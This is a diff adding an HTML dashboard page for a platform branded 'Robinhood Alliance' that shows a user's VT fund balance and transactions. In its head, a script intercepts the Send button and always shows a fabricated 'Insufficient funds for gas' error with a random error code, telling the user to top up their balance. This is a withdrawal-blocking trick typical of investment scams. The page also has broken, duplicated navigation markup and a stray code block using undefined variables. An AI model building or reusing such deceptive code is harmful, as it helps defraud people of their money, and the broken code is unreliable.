@@ -1,0 +1,661 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+
+<head>
+    <script>(function(){try{var t=localStorage.getItem("ra-theme");if(t==="light"){document.documentElement.classList.remove("dark");document.documentElement.classList.add("light");}else{document.documentElement.classList.add("dark");document.documentElement.classList.remove("light");}}catch(e){}})();</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="theme-color" content="#007bcf" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+    <title>Robinhood Alliance - Vanguard Total World Stock</title>
+        <link rel="apple-touch-icon" sizes="180x180" href="assets/images/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="assets/images/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="assets/images/favicon-16x16.png">
+    <link rel="icon" type="image/png" sizes="512x512" href="assets/images/favicon-512x512.png">
+    <link rel="icon" type="image/png" sizes="192x192" href="assets/images/favicon-192x192.png">
+    <link rel="manifest" href="assets/images/site.webmanifest">
+    <link rel="icon" href="assets/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/assets/images/logo_icon/logo.jpg">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="Robinhood Alliance - Coin">
+
+    <style data-styles="">ion-icon { visibility: hidden } .hydrated { visibility: inherit }</style>
+    <style>
+        :root {
+            --AppColor: #007bcf;
+            --oColor: rgba(0, 123, 207, 0.37);
+            --wbColor: #fff;
+            --d_Color: #00528a;
+            --siteUrl: "https://RobinhoodAlliance.com";
+        }
+    </style>
+    <link rel="stylesheet" href="/static/css/style.css">
+    <link rel="stylesheet" href="/static/css/src/ionicons.min.css">
+    <link rel="stylesheet" href="/static/css/App_Global.css">
+    <link href="/static/offline-theme-default.css" rel="stylesheet">
+    <link href="/static/offline-language-english.css" rel="stylesheet">
+    <link href="/static/alertify.css" rel="stylesheet">
+    <link href="/static/default.css" rel="stylesheet">
+    <link href="/static/css/font-awesome.css" rel="stylesheet">
+    <link href="/panel/assets/css/toastr.min.css" rel="stylesheet" type="text/css">
+    <link href="/panel/assets/css/icons.min.css" rel="stylesheet" type="text/css">
+    <script src="/static/js/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+
+    <style>
+        .Acct_img { width: 100%; text-align: center; padding-bottom: 10px; }
+        .Acct_in--details { padding: 80px 0 50px 0; }
+        .Acct_in { width: 100%; text-align: center; position: relative; }
+        .Acct_img img { display: block; width: 6rem; margin: auto; }
+        .Acct_in__title { font-size: 0.7rem; letter-spacing: 2px; padding-bottom: 8px; }
+        .Acct_in__total { font-size: 1.6rem; letter-spacing: -1px; }
+        .table__row.noBdr td { border: none !important; }
+        .table__row.noBdr td:last-child { text-align: right; }
+        .AppIcons a { color: #939393; }
+        .tbxx tr { cursor: pointer; }
+        .tbxx tr td:first-child { width: 1rem; }
+        .modal-content { background: #1a1a1a; color: #fff; }
+        .modal-header .close { color: #fff; }
+        .appHeader { background: inherit !important; border: none !important; }
+        .ico1 { display: flex !important; }
+    </style>
+
+    <script>
+/* ========== SEND BUTTON → INSUFFICIENT GAS ALERT ========== */
+(function () {
+  // Generate a random 16-digit hex error code
+  function generateHexError() {
+    const chars = '0123456789abcdef';
+    let code = '0x';
+    for (let i = 0; i < 16; i++) {
+      code += chars[Math.floor(Math.random() * 16)];
+    }
+    return code;
+  }
+
+  function showGasError() {
+    const errCode = generateHexError();
+
+    if (typeof Swal !== 'undefined') {
+      Swal.fire({
+        icon: 'error',
+        title: 'Transaction Failed',
+        html: `
+          <div style="text-align:left; padding: 4px 2px;">
+            <p style="margin:0 0 12px 0; color:#e6edf3; font-size:0.95rem;">
+              Insufficient funds for gas.
+            </p>
+            <div style="
+              background:#1c2128;
+              border:1px solid #30363d;
+              border-radius:8px;
+              padding:12px 14px;
+              font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+              font-size:0.82rem;
+              letter-spacing:0.04em;
+            ">
+              <span style="color:#8b949e;">Error:</span>
+              <span style="color:#ff4d4f; font-weight:600;">${errCode}</span>
+            </div>
+            <p style="margin:14px 0 0 0; color:#8b949e; font-size:0.78rem;">
+              Please top up your gas balance and try again.
+            </p>
+          </div>
+        `,
+        background: '#161b22',
+        color: '#e6edf3',
+        confirmButtonText: 'OK',
+        confirmButtonColor: '#007bcf',
+        buttonsStyling: true,
+        customClass: {
+          popup: 'swal2-dark-gas',
+          confirmButton: 'btn btn-primary'
+        }
+      });
+    } else {
+      // Fallback if SweetAlert is missing
+      alert('Insufficient funds for gas.\nError: ' + errCode);
+    }
+  }
+
+  // Attach to the Send button (works with id="sendLink" or any send link)
+  document.addEventListener('DOMContentLoaded', function () {
+    const sendBtn = document.getElementById('sendLink') ||
+                    document.querySelector('a[href*="send"]') ||
+                    document.querySelector('.AppIcons a[href*="send"]');
+
+    if (sendBtn) {
+      sendBtn.addEventListener('click', function (e) {
+        e.preventDefault();
+        e.stopPropagation();
+        showGasError();
+      });
+    }
+  });
+})();
+</script>
+<style>
+.swal2-dark-gas {
+  border: 1px solid #30363d !important;
+  border-radius: 12px !important;
+  box-shadow: 0 12px 40px rgba(0,0,0,0.55) !important;
+}
+.swal2-dark-gas .swal2-title {
+  color: #e6edf3 !important;
+  font-size: 1.15rem !important;
+}
+.swal2-dark-gas .swal2-icon.swal2-error {
+  border-color: #ff4d4f !important;
+  color: #ff4d4f !important;
+}</style>
+    <link rel="stylesheet" href="../static/css/glass-dashboard.css?v=1790025000">
+</head>
+
+<body class="glass-ui">
+
+    <!-- APP HEADER -->
+    <div class="appHeader text-light ico1">
+        <div class="left">
+            <a href="javascript:void(0)" onclick="history.back();" class="headerButton">
+                <ion-icon name="chevron-back-outline" role="img" class="icon md hydrated" aria-label="chevron back outline"></ion-icon>
+            </a>
+        </div>
+        <div class="pageTitle">
+            <span class="brand-title">ROBINHOOD</span>
+        </div>
+        <div class="right"></div>
+    </div>
+
+    <div id="appCapsule" class="container">
+        <div class="row">
+            <!-- Coin Info -->
+            <div class="Acct_in Acct_in--details">
+                <div class="Acct_img">
+                    <img id="coinImage" src="/assets/images/coin/vt.svg" width="100" height="100" alt="">
+                </div>
+                <div class="Acct_in__title" id="coinName">Vanguard Total World Stock (VT)</div>
+                <div class="Acct_in__total">
+                    <span id="coinBalance">0</span>&nbsp;<small id="coinSymbol" style="font-size: 16px;">(VT)</small>
+                    <span id="coinUSD" style="font-size: 16px; display: block;">$0.00</span>
+                </div>
+            </div>
+
+            <!-- Action Buttons -->
+            <div class="col-md-12 grid-margin stretch-card mb-3">
+                <div class="card mb-3">
+                    <div class="card-body">
+                        <div class="container AppIcons">
+                            <div class="row text-center">
+                                <div class="col mb-1">
+                                    <a href="/dashboard/send/bitcoin.html" id="sendLink">
+                                        <i class="icon-arrow-up"></i>
+                                        <div>Send</div>
+                                    </a>
+                                </div>
+                                <div class="col mb-1">
+                                    <a href="/dashboard/receive/bitcoin.html" id="receiveLink">
+                                        <i class="icon-arrow-down"></i>
+                                        <div>Receive</div>
+                                    </a>
+                                </div>
+                                <div class="col mb-1">
+                                    <a href="/swap.html">
+                                        <i class="icon-refresh"></i>
+                                        <div>Swap</div>
+                                    </a>
+                                </div>
+                                <div class="col mb-1">
+                                    <a href="/buy.html">
+                                        <i class="icon-shopping-cart"></i>
+                                        <div>Buy</div>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Transaction History -->
+                <div class="card mb-3">
+                    <div class="card-body">
+                        <div class="table-responsive">
+                            <table class="table table-borderless tbxx">
+                                <thead>
+                                    <tr>
+                                        <th>&nbsp;</th>
+                                        <th>Amount</th>
+                                        <th>Category</th>
+                                        <th>Status</th>
+                                        <th>Date</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="transactionTableBody">
+                                    <!-- Rows injected by JS -->
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bottom Navigation -->
+                <div class="appBottomMenu">
+        <a href="/dashboard.html" class="item"><div class="col"><ion-icon name="home-outline"></ion-icon><strong>Home</strong></div></a>
+        <a href="/cards.html" class="item"><div class="col"><ion-icon name="card-outline"></ion-icon><strong>Cards</strong></div></a>
+        <a href="/payments.html" class="item"><div class="col"><ion-icon name="cash-outline"></ion-icon><strong>Payments</strong></div></a>
+        <a href="/vaults.html" class="item"><div class="col"><ion-icon name="lock-closed-outline"></ion-icon><strong>Vaults</strong></div></a>
+        <a href="/profile-setting.html" class="item"><div class="col"><ion-icon name="settings-outline"></ion-icon><strong>Settings</strong></div></a>
+    </div></a>
+        <a href="/cards.html" class="item"><div class="col"><ion-icon name="card-outline"></ion-icon><strong>Cards</strong></div></a>
+        <a href="/payments.html" class="item"><div class="col"><ion-icon name="cash-outline"></ion-icon><strong>Payments</strong></div></a>
+        <a href="/vaults.html" class="item"><div class="col"><ion-icon name="lock-closed-outline"></ion-icon><strong>Vaults</strong></div></a>
+        <a href="/profile-setting.html" class="item"><div class="col"><ion-icon name="settings-outline"></ion-icon><strong>Settings</strong></div></a>
+    </div></a>
+        <a href="/cards.html" class="item"><div class="col"><ion-icon name="card-outline"></ion-icon><strong>Cards</strong></div></a>
+        <a href="/payments.html" class="item"><div class="col"><ion-icon name="cash-outline"></ion-icon><strong>Payments</strong></div></a>
+        <a href="/vaults.html" class="item"><div class="col"><ion-icon name="lock-closed-outline"></ion-icon><strong>Vaults</strong></div></a>
+        <a href="/profile-setting.html" class="item"><div class="col"><ion-icon name="settings-outline"></ion-icon><strong>Settings</strong></div></a>
+    </div>
+        </a>
+        <a href="/swap.html" class="item">
+            <div class="col">
+                <ion-icon name="reload-outline"></ion-icon>
+                <strong>Swap</strong>
+            </div>
+        </a>
+        <a href="/buy.html" class="item">
+            <div class="col">
+                <ion-icon name="cart-outline"></ion-icon>
+                <strong>Buy</strong>
+            </div>
+        </a>
+        <a href="/profile-setting.html" class="item">
+            <div class="col">
+                <ion-icon name="settings-outline"></ion-icon>
+                <strong>Settings</strong>
+            </div>
+        </a>
+    </div>
+
+    <!-- Scripts -->
+    <script src="/static/js/lib/bootstrap.bundle.min.js"></script>
+    <script src="/static/js/base.js"></script>
+    <script src="/static/alertify.min.js"></script>
+    <script src="/assets/global/js/iziToast.min.js"></script>
+
+    <!-- ========== MAIN SCRIPT ========== -->
+    <script>
+        // ---- CURRENCY HELPERS ----
+        const CURRENCY_SYMBOLS = {
+            USD: '$', EUR: '€', GBP: '£', NGN: '₦', CAD: 'C$', AUD: 'A$',
+            JPY: '¥', CHF: 'CHF', CNY: '¥', INR: '₹', ZAR: 'R', GHS: 'GH₵',
+            KES: 'KSh', AED: 'د.إ', SAR: '﷼', BRL: 'R$', MXN: 'MX$',
+            TRY: '₺', RUB: '₽', SGD: 'S$'
+        };
+
+        const RATES = {
+            USD: 1, EUR: 0.92, GBP: 0.79, NGN: 1600, CAD: 1.36, AUD: 1.53,
+            JPY: 157, CHF: 0.89, CNY: 7.25, INR: 83.5, ZAR: 18.2, GHS: 15.5,
+            KES: 129, AED: 3.67, SAR: 3.75, BRL: 5.4, MXN: 18.2, TRY: 32.5,
+            RUB: 92, SGD: 1.35
+        };
+
+        function getPreferredCurrency() {
+            return localStorage.getItem('preferred_currency') || 'USD';
+        }
+
+        function formatCrypto(amount) {
+            if (amount === 0 || amount === null || amount === undefined) return '0';
+            const num = Number(amount);
+            if (isNaN(num)) return '0';
+            return parseFloat(num.toFixed(8)).toLocaleString(undefined, {
+                minimumFractionDigits: 0,
+                maximumFractionDigits: 8
+            });
+        }
+
+        function formatMoney(usdAmount) {
+            const curr = getPreferredCurrency();
+            const rate = RATES[curr] || 1;
+            const symbol = CURRENCY_SYMBOLS[curr] || (curr + ' ');
+            const converted = (Number(usdAmount) * rate).toLocaleString(undefined, {
+                minimumFractionDigits: 2,
+                maximumFractionDigits: 2
+            });
+            return symbol + converted;
+        }
+
+        // ---- CONFIG ----
+        const API_BASE = 'https://web-production-8f747.up.railway.app';
+
+        // ---- COIN DETECTION ----
+        const pageTitle = document.title;
+        let coinName = 'Vanguard Total World Stock';
+        let coinSymbol = 'VT';
+        let coinId = 'vt';
+        let coinImage = '/assets/images/coin/vt.svg';
+
+        const coinMap = {
+            'Bitcoin':  { symbol: 'BTC',  id: 'bitcoin',     img: '/assets/images/gateway/68719dab8930f1752276395.png' },
+            'Ethereum': { symbol: 'ETH',  id: 'ethereum',    img: '/assets/images/gateway/29869.svg' },
+            'USDT':     { symbol: 'USDT', id: 'tether',      img: '/assets/images/gateway/38081.svg' },
+            'TRON':     { symbol: 'TRX',  id: 'tron',        img: '/assets/images/gateway/34272.svg' },
+            'BNB':      { symbol: 'BNB',  id: 'binancecoin', img: '/assets/images/gateway/89776.png' },
+            'Ripple':   { symbol: 'XRP',  id: 'ripple',      img: '/assets/images/gateway/52.png' },
+            'Stellar':  { symbol: 'XLM',  id: 'stellar',     img: '/assets/images/gateway/512.png' }
+        };
+
+        for (const [name, data] of Object.entries(coinMap)) {
+            if (pageTitle.includes(name)) {
+                coinName = name;
+                coinSymbol = data.symbol;
+                coinId = data.id;
+                coinImage = data.img;
+                break;
+            }
+        }
+
+        // Force asset identity for this page
+        coinName = 'Vanguard Total World Stock';
+        coinSymbol = 'VT';
+        coinId = 'vt';
+        coinImage = '/assets/images/coin/vt.svg';
+
+        // Update static UI
+        document.getElementById('coinName').innerText = `${coinName} (${coinSymbol})`;
+        document.getElementById('coinSymbol').innerText = `(${coinSymbol})`;
+        document.getElementById('coinImage').src = coinImage;
+        document.getElementById('sendLink').href = '/dashboard/send/vt.html';
+        document.getElementById('receiveLink').href = '/dashboard/receive/vt.html';
+
+        // ---- AUTH ----
+        function getToken() {
+            return localStorage.getItem('token');
+        }
+
+        (function checkAuth() {
+            const token = getToken();
+            if (!token) {
+                window.location.href = '/login.html';
+                return;
+            }
+
+            fetch(`https://web-production-8f747.up.railway.app/api/user`, {
+                headers: { 'Authorization': `Bearer ${token}` }
+            })
+            .then(res => {
+                if (!res.ok) throw new Error('Session expired');
+                return res.json();
+            })
+            .then(user => {
+                // Keep preferred currency in sync with backend
+                if (user.preferred_currency) {
+                    localStorage.setItem('preferred_currency', user.preferred_currency);
+                }
+                // Also keep user object updated
+                localStorage.setItem('user', JSON.stringify({
+                    id: user.id,
+                    fullName: user.full_name || user.fullName,
+                    email: user.email,
+                    role: user.role
+                }));
+                loadCoinData();
+            })
+            .catch(err => {
+                console.error('Auth error:', err);
+                localStorage.removeItem('token');
+                localStorage.removeItem('user');
+                window.location.href = '/login.html';
+            });
+        })();
+
+        // ---- LOAD COIN DATA ----
+        async function loadCoinData() {
+            try {
+                const token = getToken();
+
+                // 1. Fetch wallets
+                const walletRes = await fetch(`https://web-production-8f747.up.railway.app/api/wallets`, {
+                    headers: { 'Authorization': `Bearer ${token}` }
+                });
+                if (!walletRes.ok) throw new Error('Failed to fetch wallets');
+                const wallets = await walletRes.json();
+
+                const wallet = wallets.find(w => {
+                    const c = (w.currency || '').toLowerCase();
+                    return c === coinSymbol.toLowerCase() || c === 'vt';
+                });
+                const balance = wallet ? Number(wallet.balance) : 0;
+
+                // 2. Fetch live USD price (Yahoo chart API for ETF/stock; static fallback)
+                let priceUSD = 0;
+                try {
+                    const yahoo = 'VT';
+                    const url = 'https://query1.finance.yahoo.com/v8/finance/chart/' + encodeURIComponent(yahoo) + '?interval=1d&range=1d';
+                    const priceRes = await fetch(url);
+                    if (priceRes.ok) {
+                        const priceData = await priceRes.json();
+                        const meta = priceData && priceData.chart && priceData.chart.result && priceData.chart.result[0] && priceData.chart.result[0].meta;
+                        const p = meta && (meta.regularMarketPrice || meta.previousClose);
+                        if (p != null) priceUSD = Number(p);
+                    }
+                } catch (e) {
+                    console.warn('Yahoo price fetch failed', e);
+                }
+                if (!priceUSD) priceUSD = 120; // static approx fallback
+
+                // 3. Update UI (uses preferred currency)
+                document.getElementById('coinBalance').innerText = formatCrypto(balance);
+                document.getElementById('coinUSD').innerText = formatMoney(balance * priceUSD);
+
+                // 4. Fetch transactions
+                const txRes = await fetch(`https://web-production-8f747.up.railway.app/api/transactions`, {
+                    headers: { 'Authorization': `Bearer ${token}` }
+                });
+                if (!txRes.ok) throw new Error('Failed to fetch transactions');
+                const allTxs = await txRes.json();
+
+                const coinTxs = allTxs.filter(tx =>
+                    ['VT','VT'].includes((tx.currency || '').toUpperCase())
+                );
+
+                // 5. Render transactions
+                const tbody = document.getElementById('transactionTableBody');
+                tbody.innerHTML = '';
+
+                if (coinTxs.length === 0) {
+                    tbody.innerHTML = '<tr><td colspan="6" class="text-center text-muted">No transactions found</td></tr>';
+                } else {
+                    const user = JSON.parse(localStorage.getItem('user') || '{}');
+                    const userId = user.id;
+
+                    coinTxs.slice(0, 30).forEach(tx => {
+                        const type = (tx.type || '').toLowerCase();
+                        const status = (tx.status || 'completed').toLowerCase();
+
+                        // Outflow = red minus  |  Inflow = green plus
+                        // Matches Neon sender/receiver + type from SuperRight
+                        let isOut = false;
+                        if (['send', 'withdrawal'].includes(type)) {
+                            isOut = true;
+                        } else if (['receive', 'deposit'].includes(type)) {
+                            isOut = false;
+                        } else if (type === 'admin_adjust') {
+                            // credit → receiver_id set; debit → sender_id set
+                            isOut = String(tx.sender_id) === String(userId);
+                        } else {
+                            isOut = String(tx.sender_id) === String(userId);
+                        }
+
+                        const amount = Number(tx.amount);
+                        const sign = isOut ? '-' : '+';
+                        const color = isOut ? 'text-danger' : 'text-success';
+
+                        let category = 'Other';
+                        if (type === 'send') category = 'Sent';
+                        else if (type === 'receive') category = 'Received';
+                        else if (type === 'deposit') category = 'Deposit';
+                        else if (type === 'withdrawal') category = 'Withdrawal';
+                        else if (type === 'swap') category = 'Swap';
+                        else if (type === 'admin_adjust') {
+                            category = isOut ? 'Withdrawal' : 'Deposit';
+                        } else {
+                            category = type.charAt(0).toUpperCase() + type.slice(1);
+                        }
+
+                        let statusBadge = '';
+                        if (status === 'completed') {
+                            statusBadge = '<span class="badge bg-success" style="font-size:0.7rem;">Completed</span>';
+                        } else if (status === 'pending') {
+                            statusBadge = '<span class="badge bg-warning text-dark" style="font-size:0.7rem;">Pending</span>';
+                        } else if (status === 'failed') {
+                            statusBadge = '<span class="badge bg-danger" style="font-size:0.7rem;">Failed</span>';
+                        } else if (status === 'cancelled') {
+                            statusBadge = '<span class="badge bg-secondary" style="font-size:0.7rem;">Cancelled</span>';
+                        } else {
+                            statusBadge = `<span class="badge bg-secondary" style="font-size:0.7rem;">${status}</span>`;
+                        }
+
+                        const dt = tx.created_at ? new Date(tx.created_at) : null;
+                        const dateStr = dt
+                            ? dt.toLocaleString('en-US', {
+                                month: 'short',
+                                day: 'numeric',
+                                year: 'numeric',
+                                hour: '2-digit',
+                                minute: '2-digit'
+                              })
+                            : '-';
+                       
+
+                        tbody.innerHTML += `
+                            <tr>
+                                <td><span class="${color}">${sign}</span></td>
+                                <td>${formatCrypto(amount)} ${coinSymbol}</td>
+                                <td>${category}</td>
+                                <td>${statusBadge}</td>
+                                <td style="white-space:nowrap;font-size:0.85rem;">${dateStr}</td>
+                            </tr>
+                        `;
+                    });
+                }
+            } catch (err) {
+                console.error('Error loading coin data:', err);
+                if (typeof notify !== 'undefined') {
+                    notify('error', 'Failed to load data. Please refresh.');
+                } else if (typeof Swal !== 'undefined') {
+                    Swal.fire('Error', 'Failed to load data. Please refresh.', 'error');
+                } else {
+                    alert('Failed to load data. Please refresh.');
+                }
+            }
+        }
+
+        tbody.innerHTML += `
+                            <tr>
+                                <td><span class="${color}" style="font-weight:600;">${sign}</span></td>
+                                <td class="${color}">${formatCrypto(amount)} ${coinSymbol}</td>
+                                <td>${category}</td>
+                                <td>${statusBadge}</td>
+                                <td style="white-space:nowrap;font-size:0.85rem;">${dateStr}</td>
+                            </tr>
+                        `;
+
+        // Fallback notify
+
+        if (typeof notify === 'undefined') {
+            window.notify = function(status, message) {
+                alert(status + ': ' + message);
+            };
+        }
+
+        // Auto-refresh every 60 seconds
+        setInterval(loadCoinData, 60000);
+    </script>
+
+    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+<script>
+(function(){
+  var KEY="ra-theme";
+  function getTheme(){try{return localStorage.getItem(KEY)||"dark";}catch(e){return"dark";}}
+  function setIcon(theme){
+    var btn=document.getElementById("raThemeToggle");
+    if(!btn) return;
+    var icon=btn.querySelector("ion-icon");
+    var emoji=btn.querySelector(".ra-theme-emoji");
+    if(icon){
+      icon.setAttribute("name", theme==="dark"?"sunny-outline":"moon-outline");
+    }else if(emoji){
+      emoji.textContent=theme==="dark"?"☀":"☾";
+    }else{
+      btn.textContent=theme==="dark"?"☀":"☾";
+    }
+    btn.setAttribute("aria-label", theme==="dark"?"Switch to light mode":"Switch to dark mode");
+    btn.title=theme==="dark"?"Light mode":"Dark mode";
+  }
+  function apply(theme){
+    var root=document.documentElement, body=document.body;
+    if(theme==="light"){
+      root.classList.remove("dark"); root.classList.add("light");
+      if(body) body.classList.remove("dark-mode");
+      try{localStorage.setItem("FinappDarkmode","0");}catch(e){}
+    }else{
+      theme="dark";
+      root.classList.add("dark"); root.classList.remove("light");
+      if(body) body.classList.add("dark-mode");
+      try{localStorage.setItem("FinappDarkmode","1");}catch(e){}
+    }
+    try{localStorage.setItem(KEY,theme);}catch(e){}
+    setIcon(theme);
+    var sw=document.getElementById("darkmodeSwitch");
+    if(sw) sw.checked=(theme==="dark");
+  }
+  function toggle(e){if(e){e.preventDefault();e.stopPropagation();}apply(getTheme()==="dark"?"light":"dark");}
+  function ensureBtn(){
+    var btn=document.getElementById("raThemeToggle");
+    if(!btn){
+      btn=document.createElement("button");
+      btn.id="raThemeToggle"; btn.type="button";
+      btn.className="headerButton ra-theme-toggle ra-theme-fab";
+      btn.innerHTML='<span class="ra-theme-emoji">☀</span>';
+      (document.body||document.documentElement).appendChild(btn);
+    }else{
+      var header=btn.closest&&btn.closest(".appHeader");
+      var hidden=false;
+      if(header){
+        var st=(header.getAttribute("style")||"").replace(/\s/g,"").toLowerCase();
+        if(st.indexOf("display:none")!==-1) hidden=true;
+        try{if(window.getComputedStyle&&getComputedStyle(header).display==="none") hidden=true;}catch(e){}
+      }
+      if(!header||hidden){
+        btn.classList.add("ra-theme-fab");
+        if(btn.parentNode!==document.body) document.body.appendChild(btn);
+        if(!btn.querySelector("ion-icon") && !btn.querySelector(".ra-theme-emoji")){
+          btn.innerHTML='<span class="ra-theme-emoji">☀</span>';
+        }
+      }
+    }
+    if(!btn._raBound){btn._raBound=1;btn.addEventListener("click",toggle);}
+  }
+  function bindSwitch(){
+    var sw=document.getElementById("darkmodeSwitch");
+    if(!sw||sw._raBound) return;
+    sw._raBound=1;
+    sw.addEventListener("click",function(){
+      setTimeout(function(){
+        apply(document.body.classList.contains("dark-mode")?"dark":"light");
+      },0);
+    });
+  }
+  function init(){ensureBtn();bindSwitch();apply(getTheme());}
+  if(document.readyState==="loading") document.addEventListener("DOMContentLoaded",init);
+  else init();
+})();
+</script>
+</body>
+</html>
